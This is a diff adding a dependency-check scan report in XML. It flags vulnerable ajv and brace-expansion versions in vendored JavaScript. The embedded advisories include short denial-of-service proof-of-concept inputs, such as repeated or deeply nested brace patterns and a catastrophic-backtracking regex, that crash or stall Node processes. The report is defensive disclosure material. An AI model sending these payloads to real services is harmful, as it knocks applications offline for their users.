@@ -1,0 +1,2295 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<testsuites failures="60" name="dependency-check" tests="34">
+        <testsuite failures="0" errors="0" time="0" id="0" name="/src/src/main/resources/static/vendors/jquery-mask/Gruntfile.js" package="Gruntfile.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="Gruntfile.js"/>
+    </testsuite>
+        <testsuite failures="2" errors="0" time="0" id="1" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?ajv" package="ajv:6.10.2" skipped="0" tests="2" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-v88g-cgmw-v5xw" name="pkg:npm/ajv@6.10.2">
+                <failure message="cvssV3: MEDIUM, score: 5.599999904632568 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L)"/>
+            <system-out>An issue was discovered in ajv.validate() in Ajv (aka Another JSON Schema Validator) 6.12.2. A carefully crafted JSON schema could be provided that allows execution of other code by prototype pollution. (While untrusted schemas are recommended against, the worst case of an untrusted schema should be a denial of service, not execution of code.)</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?ajv, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-2g4f-4pwh-qvx6" name="pkg:npm/ajv@6.10.2">
+                <failure message="unscored severity: moderate"/>
+            <system-out>ajv (Another JSON Schema Validator) through version 8.17.1 is vulnerable to Regular Expression Denial of Service (ReDoS) when the `$data` option is enabled. The pattern keyword accepts runtime data via JSON Pointer syntax (`$data` reference), which is passed directly to the JavaScript `RegExp()` constructor without validation. An attacker can inject a malicious regex pattern (e.g., `\&quot;^(a|a)*$\&quot;`) combined with crafted input to cause catastrophic backtracking. A 31-character payload causes approximately 44 seconds of CPU blocking, with each additional character doubling execution time. This enables complete denial of service with a single HTTP request against any API using ajv with `$data`: true for dynamic schema validation.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?ajv, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="2" name="/src/src/main/resources/static/vendors/fontawesome/js/all.js" package="all.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="all.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="3" name="/src/src/main/resources/static/vendors/fontawesome/js/all.min.js" package="all.min.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="all.min.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="4" name="/src/src/main/resources/static/vendors/fontawesome/attribution.js" package="attribution.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="attribution.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="5" name="/src/src/main/resources/static/vendors/bootstrap/js/bootstrap.bundle.js" package="bootstrap.bundle.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="bootstrap.bundle.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="6" name="/src/src/main/resources/static/vendors/bootstrap/js/bootstrap.bundle.min.js" package="bootstrap.bundle.min.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="bootstrap.bundle.min.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="7" name="/src/src/main/resources/static/vendors/bootstrap/js/bootstrap.esm.js" package="bootstrap.esm.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="bootstrap.esm.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="8" name="/src/src/main/resources/static/vendors/bootstrap/js/bootstrap.esm.min.js" package="bootstrap.esm.min.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="bootstrap.esm.min.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="9" name="/src/src/main/resources/static/vendors/bootstrap/js/bootstrap.js" package="bootstrap.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="bootstrap.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="10" name="/src/src/main/resources/static/vendors/bootstrap/js/bootstrap.min.js" package="bootstrap.min.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="bootstrap.min.js"/>
+    </testsuite>
+        <testsuite failures="8" errors="0" time="0" id="11" name="/src/src/main/resources/static/vendors/jquery-mask/package-lock.json?brace-expansion" package="brace-expansion:1.1.8" skipped="0" tests="8" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="GHSA-6j4f-fj2g-mc7p" name="pkg:npm/brace-expansion@1.1.8">
+                <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"/>
+            <system-out>### Summary
+
+`parseCommaParts()` can exhaust the native stack and crash the process. There are two distinct ways to trigger it, both reachable from a single untrusted pattern string.
+
+This is the parsing-side counterpart to CVE-2026-14257 / GHSA-mh99-v99m-4gvg. That fix made `expand_()` iterative and documented a constant-stack-depth guarantee, but `parseCommaParts()` was left recursive, so the guarantee only held for one of the two parsing paths.
+
+### Vector 1 - unbounded recursion on `post`
+
+`parseCommaParts()` recursed on the remainder of the string once per brace group:
+
+```js
+const postParts = parseCommaParts(post)   // unbounded
+```
+
+A brace group containing many comma-separated groups drives one recursion level per group:
+
+```js
+expand(&apos;{&apos; + &apos;{a},&apos;.repeat(7000) + &apos;b}&apos;)
+// RangeError: Maximum call stack size exceeded
+```
+
+About 7,300 repetitions - roughly 29 KB of input - is enough on Node 24; roughly 6,300 (25 KB) on Node 18. The threshold is identical on every affected release line.
+
+### Vector 2 - `push.apply` with an unbounded array
+
+Even with the recursion removed, `parseCommaParts()` spread whole arrays into an argument list:
+
+```js
+p.push.apply(p, postParts)
+parts.push.apply(parts, p)
+```
+
+`Function.prototype.apply` places one argument per element on the stack, so a single large array overflows it. This needs **no recursion depth at all** - the following reaches a recursion depth of exactly 1:
+
+```js
+expand(&apos;{{x},&apos; + &apos;a,&apos;.repeat(125000) + &apos;b}&apos;)
+// RangeError: Maximum call stack size exceeded
+```
+
+Threshold is about 124,300 repetitions (~249 KB). This vector was not part of the original report; it was found while verifying the fix. A patch that only de-recurses but keeps `push.apply` leaves a working denial of service behind.
+
+### Why `max` and `maxLength` do not help
+
+Both crashes happen during **parsing**, before any expansion. The payloads produce one result per group, so output size grows linearly with input and is never the limiter. `expand(payload, { max: 1, maxLength: 1 })` still overflows.
+
+### Impact
+
+Any application that passes an untrusted string to `expand()` - directly, or through `minimatch` / `glob` where it is a user-supplied glob pattern - can be crashed. In Node, a `RangeError` that the application does not catch terminates the process, so a server that globs user input is exposed to remote unauthenticated denial of service.
+
+`minimatch`&apos;s own `MAX_PATTERN_LENGTH` cap (65,536) does not help against vector 1: the overflow threshold sits well below it. Confirmed on minimatch 10.2.6 - a 64,003-byte pattern passes the length check and overflows both `minimatch.braceExpand()` and `new minimatch.Minimatch()`.
+
+This is an availability-only issue. No code execution and no data exposure.
+
+### Not a regression
+
+5.0.8 and 5.0.9 overflow at the same repetition count, so the gap predates the recent advisories; those fixes simply did not reach it. Verified affected on 1.1.18, 2.1.4, 3.0.6, 5.0.8 and 5.0.9, all at an identical threshold.
+
+### Patch
+
+`parseCommaParts()` is rewritten as a loop that carries the partial part across chunks, and every array append uses an element-by-element loop rather than `push.apply`. The redundant `if (!str) return [&apos;&apos;]` guard is dropped - the loop returns `[&apos;&apos;]` for the empty string on its own.
+
+Equivalence of the old and new implementations was checked by differential testing: exhaustive over every string of `{`, `}`, `,`, `a` up to length 7 plus 300,000 random inputs - 322,000 cases, zero mismatches.
+
+### Severity note
+
+Scored 7.5 High under CVSS 3.1 for consistency with the other availability advisories on this package (GHSA-mh99-v99m-4gvg, GHSA-rgw5-rvv9-x895), which use the same vector. The reporter self-assessed 6.9 Medium under CVSS 4.0 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N`).
+
+### Credit
+
+Reported by baeseungwon1010, with a working proof of concept and a proposed patch. Vector 2 was identified during maintainer verification.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?brace-expansion, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-mh99-v99m-4gvg" name="pkg:npm/brace-expansion@1.1.8">
+                <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"/>
+            <system-out>### Summary
+
+`expand()` bounds the *number* of results it produces (the `max` option,
+`100_000` by default) but not their *length*. By chaining many brace groups,
+an attacker keeps the result count under `max` while making every result grow
+with the number of groups. Building `max` long results — plus the intermediate
+arrays combined at each brace group — exhausts memory and crashes the Node
+process with an **uncatchable** out-of-memory error. `try/catch` around
+`expand()` does not help: the fatal error terminates the process.
+
+A ~7.5 KB input (`&apos;{a,b}&apos;.repeat(1500)`) is enough to crash a default Node
+process.
+
+### Details
+
+For `N` chained brace groups such as `&apos;{a,b}&apos;.repeat(N)`:
+
+- the result count is `2^N`, immediately capped at `max` (`100_000`), so the
+  `max` protection appears to hold, but
+- each result is `N` characters long, so the total output size is
+  `max × N` characters, which grows without bound in `N`.
+
+`expand_` combines each brace set with the fully-expanded tail:
+
+```js
+const post = m.post.length ? expand_(m.post, max, false) : [&apos;&apos;]
+...
+for (let j = 0; j &lt; N.length; j++) {
+  for (let k = 0; k &lt; post.length &amp;&amp; expansions.length &lt; max; k++) {
+    const expansion = pre + N[j] + post[k]   // grows one group longer per level
+    ...
+    expansions.push(expansion)
+  }
+}
+```
+
+The loop guard `expansions.length &lt; max` limits how many strings are built, but
+nothing limits how long they get. Each recursion level materializes another
+array of up to `max` strings, one character longer than the level below, and —
+because V8 represents `pre + N[j] + post[k]` as a cons-string (rope) that
+references `post[k]` — those intermediate strings stay reachable through the
+whole chain. Memory therefore scales with `max × N`.
+
+Measured on `5.0.7` (`&apos;{a,b}&apos;.repeat(N)`, default `max`):
+
+| groups (N) | input bytes | result count | peak RSS |
+|---|---|---|---|
+| 20 | 100 | 100,000 | ~80 MB |
+| 50 | 250 | 100,000 | ~214 MB |
+| 100 | 500 | 100,000 | ~409 MB |
+| 300 | 1,500 | 100,000 | ~1,148 MB |
+| 1500 | 7,500 | — | **OOM crash** |
+
+### Proof of concept
+
+```js
+const { expand } = require(&apos;brace-expansion&apos;)
+
+// ~7.5 KB input — crashes the process with a fatal, uncatchable OOM:
+//   FATAL ERROR: ... JavaScript heap out of memory
+try {
+  expand(&apos;{a,b}&apos;.repeat(1500))
+} catch (e) {
+  // never reached — the process is already dead
+}
+```
+
+### Impact
+
+Any application that passes attacker-influenced strings to
+`brace-expansion.expand()` — directly, or transitively via `minimatch` / `glob`
+brace patterns — can be crashed by a small request. Because the failure is a
+fatal V8 out-of-memory error rather than a thrown exception, it cannot be caught
+and it takes down the whole worker/process, denying service.
+
+### Remediation
+
+Upgrade to a patched release. The fix bounds the total number of characters a
+single `expand()` call may accumulate (`EXPANSION_MAX_LENGTH`, default
+`4_000_000`, configurable via a new `maxLength` option), applied inside the
+output-building loops so intermediate arrays are bounded too. Once the limit is
+reached, output is truncated — consistent with how `max` already truncates —
+instead of growing without bound. The limit sits well above any realistic
+expansion (100,000 results hitting `max` measure ~1M characters), so legitimate
+input is unaffected.
+
+After the fix, `&apos;{a,b}&apos;.repeat(1500)` returns a bounded, truncated result in
+~0.7 s using ~340 MB and never crashes, including under a constrained 512 MB
+heap.
+
+The fix bounds memory but the algorithm still rebuilds intermediate arrays at
+each level (roughly `O(N × maxLength)` work on this input class). A streaming
+rewrite that produces output in `O(total output size)` can be a non-urgent
+follow-up.
+
+If immediate upgrade isn&apos;t possible, avoid passing untrusted input to
+`expand()` / glob brace patterns, or pass a small explicit `max` **and**
+`maxLength`.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?brace-expansion, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-qhr7-859c-m2p7" name="pkg:npm/brace-expansion@1.1.8">
+                <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"/>
+            <system-out>### Summary
+
+`expand_()` recurses once per level of brace *nesting*. Deeply nested input exhausts the native stack and crashes the process.
+
+This is distinct from CVE-2026-14257 / GHSA-mh99-v99m-4gvg, which made the *tail* iterative (recursion on `m.post`, driven by how many groups are chained). Nesting depth drives a different recursion that the tail fix never touched, so the documented constant-stack-depth guarantee only ever covered chained input, not nested input.
+
+It is also distinct from GHSA-6j4f-fj2g-mc7p, which fixed recursion in `parseCommaParts()`. Both payloads below still crash with that fix applied.
+
+### Two recursion sites
+
+**Comma members.** Each alternative of a brace set is expanded by a recursive call, so nesting a set inside every alternative recurses once per level:
+
+```js
+expand(&apos;{a,&apos;.repeat(4000) + &apos;z&apos; + &apos;}&apos;.repeat(4000))
+// RangeError: Maximum call stack size exceeded
+```
+
+Crashes at depth 3,907 - about **15.6 KB** of input.
+
+**Single set.** A brace set whose body parses to a single part is expanded by a recursive call before being re-wrapped (`x{{a,b}}y` -&gt; `x{a}y x{b}y`), which recurses once per nesting level:
+
+```js
+expand(&apos;{&apos;.repeat(3200) + &apos;a,b&apos; + &apos;}&apos;.repeat(3200))
+// RangeError: Maximum call stack size exceeded
+```
+
+Crashes at depth 3,125 - about **6.25 KB** of input. This is the cheapest stack-exhaustion payload known against this package: roughly a quarter the input of GHSA-6j4f-fj2g-mc7p (29 KB), and about a tenth of minimatch&apos;s `MAX_PATTERN_LENGTH` (65,536).
+
+### Why `max` and `maxLength` do not help
+
+Both crashes happen while recursing into sub-expansions, before the result set grows. The payloads produce almost no output - the single-set case yields 2 results - so neither bound is ever the limiter. `expand(payload, { max: 1, maxLength: 1 })` still overflows.
+
+### Impact
+
+Any application passing an untrusted string to `expand()`, directly or through `minimatch` / `glob` as a user-supplied glob pattern, can be crashed. In Node a `RangeError` the application does not catch terminates the process, so a server globbing user input is exposed to remote unauthenticated denial of service.
+
+Availability only. No code execution, no data exposure.
+
+### Affected versions
+
+Verified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, at near-identical depths on every line (single set: 3,125 on all four; comma members: 3,907-4,102). Not a regression from any recent fix - the gap predates them.
+
+### Patch
+
+A `maxDepth` bound (default `EXPANSION_MAX_DEPTH`) is threaded through `expand_()`. Past the cap a group is treated as non-expanding and returned literally, which is how the parser already handles a group that cannot expand. This matches the existing `max` / `maxLength` caps, which truncate rather than throw, so `expand()` continues never to throw on any input.
+
+The default sits far above any realistic nesting depth and well below the crash threshold.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?brace-expansion, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-rgw5-rvv9-x895" name="pkg:npm/brace-expansion@1.1.8">
+                <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"/>
+            <system-out>### Summary
+
+The `maxLength` mitigation added in `5.0.8` for GHSA-mh99-v99m-4gvg / CVE-2026-14257 is incomplete. It bounds the accumulator where results are *combined*, but not the intermediate arrays that feed it. A ~25 KB input still crashes the Node process with an **uncatchable** out-of-memory error, so `try/catch` around `expand()` does not help.
+
+A second, related path in the same function lets a ~400 KB input block the event loop for over two minutes without ever exceeding the memory bound.
+
+### Details
+
+`maxLength` was enforced in `combine()`, the single place output grows. Two arrays are built *before* `combine()` runs, and neither was bounded.
+
+**1. Comma alternatives accumulate without a running total (memory exhaustion)**
+
+Each alternative in `{a,b,c,...}` is expanded by its own recursive `expand_()` call, so each receives a full, independent `maxLength` allowance. The results were then concatenated into a single `values` array with no cumulative limit:
+
+```js
+values = []
+for (let j = 0; j &lt; n.length; j++) {
+  values.push.apply(values, expand_(n[j], max, maxLength, false))
+}
+
+acc = combine(acc, pre, values, max, maxLength, ...)
+```
+
+With `A` alternatives, `values` can reach `A * maxLength` characters before `combine()` gets a chance to truncate it. At the default `maxLength` of 4,000,000 and 400 alternatives, that is well past any default heap.
+
+**2. Padded sequences ignore `maxLength` while generating (CPU exhaustion)**
+
+`expandSequence()` was bounded by `max` (the result *count*) but never consulted `maxLength`. A padded sequence&apos;s element width follows the input, so `{0...01..100000}` with a wide pad generates `max` elements, each as wide as the input, only for `combine()` to discard all but a handful.
+
+Memory stays flat here, because V8 represents the padded strings as cons-strings, which is likely why this path was not caught alongside the original issue. The cost is time: work proportional to `max * width`.
+
+| pad width | input bytes | results kept | time (5.0.8) | time (patched) |
+|---|---|---|---|---|
+| 20,000 | 20 KB | 199 | ~7.3 s | ~20 ms |
+| 100,000 | 100 KB | 39 | ~32 s | ~20 ms |
+| 400,000 | 400 KB | 9 | ~124 s | ~18 ms |
+
+Output is byte-identical before and after the fix; only the wasted work is removed.
+
+### Proof of concept
+
+Memory exhaustion, against `5.0.8`:
+
+```js
+import { expand } from &apos;brace-expansion&apos;
+
+const part = &apos;{&apos; + &apos;0&apos;.repeat(50) + &apos;1..100000}&apos;
+const input = &apos;{&apos; + Array(400).fill(part).join(&apos;,&apos;) + &apos;}&apos;  // ~25 KB
+
+try {
+  expand(input)
+} catch (e) {
+  // never reached - the process is already dead
+}
+```
+
+```
+FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory
+Aborted
+```
+
+Event-loop stall, against `5.0.8`:
+
+```js
+import { expand } from &apos;brace-expansion&apos;
+
+// ~400 KB input, returns 9 results after roughly two minutes of blocking CPU
+expand(&apos;{&apos; + &apos;0&apos;.repeat(400_000) + &apos;1..100000}&apos;)
+```
+
+### Impact
+
+Denial of service. Any application that passes attacker-controlled input to `expand()`, directly or transitively through a glob or pattern-matching library, can be remotely crashed or stalled. The out-of-memory variant terminates the process and cannot be handled with `try/catch`.
+
+Applications already on `5.0.8` are affected: the `5.0.8` mitigation does not cover these paths.
+
+### Patches
+
+Both intermediate arrays are now bounded as they are built, using the same `max` and `maxLength` limits already applied in `combine()`:
+
+- `values` tracks a running result count and character length while alternatives are appended, and stops once either bound is reached.
+- `expandSequence()` accepts `maxLength` and stops generating once the sequence&apos;s own characters reach it.
+
+As with the existing limits, output is truncated rather than allowed to grow without bound, which matches how `max` already behaves. The defaults sit well above any realistic expansion, so legitimate input is unaffected.
+
+### Workarounds
+
+If upgrading is not immediately possible, avoid passing untrusted input to `expand()` or to glob brace patterns, or pass an explicitly small `max` **and** `maxLength`.
+
+Note that a small `maxLength` alone was not sufficient on affected versions: it was applied per alternative rather than cumulatively, which is the root of the first issue above.
+
+### Credits
+
+The memory-exhaustion bypass was reported by Alessio Della Libera, CEO &amp; Co-founder at [Numyra](https://numyra.ai/).
+
+The sequence-generation issue was found while verifying that report.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?brace-expansion, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-f886-m6hf-6m8v" name="pkg:npm/brace-expansion@1.1.8">
+                <failure message="cvssV3: MEDIUM, score: 6.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H)"/>
+            <system-out>### Impact
+
+A brace pattern with a zero step value (e.g., `{1..2..0}`) causes the sequence generation loop to run indefinitely, making the process hang for seconds and allocate heaps of memory.
+
+The loop in question:
+
+https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L184
+
+`test()` is one of
+
+https://github.com/juliangruber/brace-expansion/blob/daa71bcb4a30a2df9bcb7f7b8daaf2ab30e5794a/src/index.ts#L107-L113
+
+The increment is computed as `Math.abs(0) = 0`, so the loop variable never advances. On a test machine, the process hangs for about 3.5 seconds and allocates roughly 1.9 GB of memory before throwing a `RangeError`. Setting max to any value has no effect because the limit is only checked at the output combination step, not during sequence generation.
+
+This affects any application that passes untrusted strings to expand(), or by error sets a step value of `0`. That includes tools built on minimatch/glob that resolve patterns from CLI arguments or config files. The input needed is just 10 bytes.
+
+### Patches
+
+
+Upgrade to versions
+- 5.0.5+
+
+A step increment of 0 is now sanitized to 1, which matches bash behavior.
+
+### Workarounds
+
+Sanitize strings passed to `expand()` to ensure a step value of `0` is not used.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?brace-expansion, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-3jxr-9vmj-r5cp" name="pkg:npm/brace-expansion@1.1.8">
+                <failure message="cvssV3: MEDIUM, score: 5.300000190734863 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)"/>
+            <system-out>### Summary
+brace-expansion&apos;s expand() exhibits exponential-time - O(2ⁿ) - behavior in the number of consecutive non-expanding {} groups. A short, all-ASCII input (~90 bytes/30 groups) blocks the calling thread for minutes; a slightly longer input hangs it effectively indefinitely. Because the dominant consumers run on Node&apos;s single-threaded event loop, one small input can fully stall a worker/process.
+
+In `expand_`, `post` is computed unconditionally at the top of the function, before the early-return branches that don&apos;t use it:
+```js
+const post = m.post.length ? expand_(m.post, max, false) : [&apos;&apos;];   // always recurses
+  ...
+if (!isSequence &amp;&amp; !isOptions) {
+  if (m.post.match(/,(?!,).*\}/)) {
+    str = m.pre + &apos;{&apos; + m.body + escClose + m.post;
+    return expand_(str, max, true); // restart — `post` discarded
+  }
+  return [str];
+}
+```
+
+For input like a{},{},…, the first {} is non-expanding, so control reaches the {a},b} rewrite branch - but `expand_` has already recursed into post over the entire remaining tail, only to throw the result away.
+Each level therefore spawns two recursive expansions over essentially the same remaining work: `T(n) = 2·T(n−1) ⇒ O(2ⁿ)`.
+
+The max option does not mitigate this: max only bounds the output-building loops; neither the post recursion nor the rewrite recursion consults it.
+  
+Measured on 5.0.6:
+
+| groups (n) | input bytes | time |
+|---|---|---|
+| 20 | 60 | 130 ms |
+| 24 | 72 | 1.9 s |
+| 26 | 78 | 7.8 s |
+| 30 (PoC) | 90 | ~2 min |
+
+### Proof of concept
+```js
+const { expand } = require(&apos;brace-expansion&apos;);
+// 30 non-expanding groups, ~90 bytes — blocks for minutes:
+expand(&apos;a{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{},{}&apos;);
+```
+
+### Impact
+
+Any application that passes attacker-influenced strings to brace-expansion.expand() - directly or transitively via minimatch/glob brace patterns - can be driven into a multi-minute-to-indefinite CPU hang by a tiny request, denying service on that thread/process.
+
+### Remediation
+
+Upgrade to a patched release. The fix:
+1. Defers computing post until after the early-return branches (and computes it locally in the $-suffix branch), so post is only expanded when a brace set actually expands and the value is used. This alone removes the exponential.
+1. Converts the {a},b} rewrite from recursion to an in-function loop, so a long run of rewrites cannot grow the call stack.
+
+Verified: the PoC drops from ~2 min to 0.55 ms, 5,000 groups complete in ~344 ms, and output is identical to 5.0.6 across a behavioral-equivalence suite (sequences, padding, $-prefix, a{},b}c, {},a}b, x{{a,b}}y, etc.). Post-fix complexity is ~O(n²) on this input class - acceptable for the security fix; a linear rewrite can be a non-urgent follow-up.
+
+If immediate upgrade isn&apos;t possible, avoid passing untrusted input to expand() / glob brace patterns, or run such expansion under a timeout/worker.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?brace-expansion, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-q2hr-2g5m-vwhr" name="pkg:npm/brace-expansion@1.1.8">
+                <failure message="cvssV3: MEDIUM, score: 5.300000190734863 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)"/>
+            <system-out>### Summary
+
+Expanding `{a},b}`-shaped input takes time quadratic in the number of literal `}` characters, blocking the event loop.
+
+Bash preserves a quirk where a brace group followed by a comma set still expands (`{a},b}`). The parser implements this by rewriting the string and restarting the scan. Each pass absorbs exactly one `}` and re-scans from the beginning, so `n` trailing braces cost `n` full passes.
+
+### Reproduction
+
+```js
+const build = n =&gt; &apos;{a}&apos; + &apos;}&apos;.repeat(n) + &apos;,z}&apos;
+
+for (const n of [8000, 16000, 32000, 64000, 128000]) {
+  const t = Date.now()
+  expand(build(n))
+  console.log(n, Date.now() - t + &apos;ms&apos;)
+}
+```
+
+| n | input | time | results |
+|---|---|---|---|
+| 8,000 | 8 KB | 110 ms | 2 |
+| 16,000 | 16 KB | 446 ms | 2 |
+| 32,000 | 32 KB | 1.7 s | 2 |
+| 64,000 | 64 KB | 6.9 s | 2 |
+| 128,000 | 128 KB | **27.7 s** | 2 |
+
+`ms/n^2` is flat at ~1.7 and each doubling of `n` costs exactly 4.0x - quadratic. 128 KB of input blocks the event loop for nearly half a minute to produce two results.
+
+### Mechanism
+
+Instrumenting the rewrite branch confirms it runs exactly `n + 1` times, once per literal `}`, each re-scanning the whole string.
+
+There is a second multiplier. The rewrite replaces the group&apos;s closing `}` with the internal `escClose` sentinel, which is `&apos;\0CLOSE&apos; + Math.random() + &apos;\0&apos;` - about 25 characters. The working string therefore *grows* by ~25 characters on every pass:
+
+| n | input length | final string length |
+|---|---|---|
+| 1,000 | 1,006 | 26,006 |
+| 8,000 | 8,006 | 208,006 |
+
+So the input is inflated roughly 26x, and that factor multiplies both the quadratic constant and peak memory. This makes it partly a memory-pressure issue as well as a CPU one.
+
+### Why `max` and `maxLength` do not help
+
+The cost is in parsing, before the result set exists. The payload yields 2 results regardless of size, so neither bound is ever reached.
+
+### Impact
+
+An application passing an untrusted pattern to `expand()`, directly or through `minimatch` / `glob`, can have its event loop blocked for tens of seconds by a payload well under minimatch&apos;s 65,536-character cap. For a single-threaded Node server that is a full stall, not just a slow request.
+
+Degraded availability rather than a crash - the process recovers once the expansion completes.
+
+### Affected versions
+
+Verified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, all within a few percent of each other (~460-490 ms at n=16,000).
+
+### Patch
+
+The rewrite loop gets an iteration bound. Past the cap the remaining string is treated as non-expanding and returned literally, consistent with the existing `max` / `maxLength` caps, which truncate rather than throw.
+
+Note this bounds the number of passes, not the cost of each: worst-case work remains proportional to `cap x input length`. The cap is set low enough that the residual is bounded in practice, and far above what any realistic `{a},b}` input needs.
+
+### Severity note
+
+Scored 5.3 Medium (`A:L`) for consistency with GHSA-3jxr-9vmj-r5cp, the other algorithmic-complexity advisory on this package (CWE-407), which uses the same vector. The stack-exhaustion advisories on this package score `A:H` because they crash the process outright; this one stalls it.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?brace-expansion, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-v6h2-p8h4-qcjw" name="pkg:npm/brace-expansion@1.1.8">
+                <failure message="cvssV3: LOW, score: 3.0999999046325684 (CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L)"/>
+            <system-out>A vulnerability was found in juliangruber brace-expansion up to 1.1.11/2.0.1/3.0.0/4.0.0. It has been rated as problematic. Affected by this issue is the function expand of the file index.js. The manipulation leads to inefficient regular expression complexity. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. Upgrading to version 1.1.12, 2.0.2, 3.0.1 and 4.0.1 is able to address this issue. The name of the patch is `a5b98a4f30d7813266b221435e1eaaf25a1b0ac5`. It is recommended to upgrade the affected component.</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?brace-expansion, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="12" name="/src/src/main/resources/static/vendors/fontawesome/js/brands.js" package="brands.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="brands.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="13" name="/src/src/main/resources/static/vendors/fontawesome/js/brands.min.js" package="brands.min.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="brands.min.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="14" name="/src/src/main/resources/static/vendors/fontawesome/js/conflict-detection.js" package="conflict-detection.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="conflict-detection.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="15" name="/src/src/main/resources/static/vendors/fontawesome/js/conflict-detection.min.js" package="conflict-detection.min.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="conflict-detection.min.js"/>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="16" name="/src/src/main/resources/static/vendors/jquery-mask/test/zepto/data.js" package="data.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="data.js"/>
+    </testsuite>
